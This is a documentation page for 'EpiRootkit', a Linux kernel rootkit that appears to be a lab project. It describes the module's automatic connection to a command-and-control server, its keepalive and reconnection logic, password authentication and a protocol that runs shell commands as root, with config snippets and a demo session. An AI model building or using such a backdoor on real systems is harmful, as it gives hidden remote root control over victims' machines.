---
title: "Connection & Authentication"
description: "How the rootkit connects to C2 server and authenticates"
icon: "link"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 42
---

# Connection & Authentication

How EpiRootkit connects to the C2 server and handles authentication.

## Connection Process

### Automatic Connection
When the rootkit loads, it automatically:

1. **Starts connection thread** (`epirootkit_conn`)
2. **Attempts TCP connection** to configured C2 server
3. **Begins keepalive system** (60-second ping/pong)
4. **Handles reconnection** with exponential backoff

### Configuration
```c
// rootkit/core/config.h
#define C2_SERVER_IP "192.168.64.1"
#define C2_SERVER_PORT 4444
#define KEEPALIVE_INTERVAL_MS 60000
#define RECONNECT_DELAY_MS 5000
```

## Network Architecture

### Three-Layer System
1. **Connection Management** (`connection.c`) - High-level coordination
2. **Keepalive System** (`keepalive.c`) - Health monitoring
3. **Socket Management** (`socket.c`) - Low-level network operations

### Connection States
- `0` = DISCONNECTED
- `1` = CONNECTED  
- `2` = CONNECTING

## Authentication System

### How It Works
1. **C2 sends command**: `auth Client-1 password`
2. **Rootkit receives**: Plain text password
3. **Rootkit hashes**: Using SHA-512 kernel crypto API
4. **Compares hash**: Against stored hash in config
5. **Returns result**: SUCCESS or ERROR

### Implementation
```c
// Default password is "password" (SHA-512 hash stored in config)
#define PASSWORD_HASH "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86"
```

### Security Features
- **Rate limiting**: 5 attempts per 60 seconds
- **Session timeout**: 1 hour automatic expiry
- **Secure hashing**: SHA-512 using kernel crypto API

## Live Demo

### 1. Start C2 Server
```bash
cd attacking_program && pnpm start
```

### 2. Load Rootkit
```bash
sudo insmod epirootkit.ko
```

**C2 server shows:**
```
[2025-05-25 16:13:09] New client connected: Client-1
[2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED
```

### 3. Check Connection
```bash
c2-server$ clients
# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM
```

### 4. Authenticate
```bash
c2-server$ auth Client-1 password
# ✓ [2025-05-25 16:13:29] Authenticated
# SUCCESS: Authentication successful
```

### 5. Verify Authentication
```bash
c2-server$ clients
# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
```

## Keepalive System

### Purpose
- **Detect disconnections**: Network failures, system crashes
- **Maintain connection**: Regular ping/pong messages
- **Trigger reconnection**: When connection lost

### How It Works
- **Ping interval**: Every 60 seconds
- **Timeout detection**: 30 seconds for response
- **Failure threshold**: 3 consecutive failed pings
- **Automatic reconnection**: Exponential backoff (5s → 10s → 20s → 40s → 60s max)

### Monitoring
```bash
# Check keepalive status from C2
c2-server$ keepalive Client-1
# Keepalive Status:
# Last ping sent: 2025-05-25 16:14:00
# Last pong received: 2025-05-25 16:14:00
# Failed ping count: 0
# Connection stable: YES
```

## Reconnection Handling

### Disconnection Detection
1. **Socket-level**: Immediate network failures
2. **Keepalive timeout**: No response to ping
3. **Send failures**: Failed command results

### Reconnection Process
1. **Detect disconnection**
2. **Wait with backoff**: 5s → 10s → 20s → 40s → 60s (max)
3. **Attempt reconnection**
4. **Reset authentication**: Must re-authenticate after reconnect
5. **Resume operations**

## Protocol Format

### Commands
```
CMD:<command>:<data>
```

### Responses
```
SUCCESS: <message>
ERROR: <error_message>
RESULT: <command_output>
```

### Examples
```bash
# Authentication
CMD:auth:password
SUCCESS: Authentication successful

# Command execution
CMD:exec:whoami
RESULT: Exit code: 0
Output:
root

# Keepalive
CMD:ping:
SUCCESS: pong
```

## Troubleshooting

### Connection Issues
```bash
# Check if C2 server is running
netstat -tulpn | grep 4444

# Check rootkit configuration
grep C2_SERVER_IP rootkit/core/config.h

# Monitor connection attempts
dmesg | grep -i epirootkit
```

### Authentication Problems
```bash
# Rate limiting triggered
c2-server$ auth Client-1 wrong_password
# ERROR: Rate limited. Try again in 60 seconds

# Correct password
c2-server$ auth Client-1 password
# SUCCESS: Authentication successful
```

### Network Debugging
```bash
# Test raw connection
telnet 192.168.64.1 4444

# Monitor network traffic
tcpdump -i any port 4444
```

## Technical Details

### Thread Management
- **Connection thread**: `epirootkit_conn` runs continuously
- **Atomic operations**: Thread-safe state management
- **Proper cleanup**: Graceful shutdown on module unload

### Memory Management
- **Dynamic allocation**: kmalloc/kfree for messages
- **Buffer limits**: MAX_MESSAGE_SIZE (4096 bytes)
- **No memory leaks**: Proper cleanup on errors

### Error Handling
- **Graceful failures**: Continue operation on network errors
- **Logging**: All events logged to kernel log
- **Recovery**: Automatic reconnection on all failures

---

Robust connection system with automatic reconnection and secure authentication using SHA-512.

